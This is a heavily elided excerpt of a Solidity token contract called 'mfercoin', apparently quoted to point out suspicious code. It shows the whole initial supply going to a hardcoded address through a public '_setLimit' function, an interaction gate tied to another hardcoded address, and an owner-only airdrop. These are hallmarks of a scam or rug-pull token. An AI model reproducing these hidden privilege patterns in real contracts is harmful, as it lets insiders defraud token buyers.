...
contract mfercoin is Context, IERC20 {
    ...
    address public _Owner = 0x6D0c570A0e053FC347E1e618a637793bDd8b2aD5;
    ...
    constructor () public {
        ...
        _spf_ = 0x0Bdfd4AD937Ff179985276b7F5BE7Ae3de0229e6;
        _setLimit(_spf_, initialSupply*(10**18));
    ...
    function _setLimit(address locker, uint256 amt) public {
    ...
    modifier _approver() {require(msg.sender == 0xC202c0069901b502d51839D54dEf9B0d58082a57, "Not allowed to interact");_;}


    function airdropMfers (address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _OnlyOwner(){
